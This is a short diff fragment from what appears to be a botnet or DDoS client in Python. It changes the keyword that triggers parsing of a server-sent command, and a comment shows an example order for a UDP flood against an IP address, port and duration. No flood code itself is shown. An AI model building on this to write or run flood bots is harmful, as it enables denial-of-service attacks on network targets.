@@ -61,7 +61,7 @@ class Client():
     def start(self):
         while True:
             data = self._recv()
-            if "attack" in data:
+            if "udp" in data:
                 #attack udp 192.168.1.1 50 120 3000
                 data=data.replace("attack ","").split()
                 try:
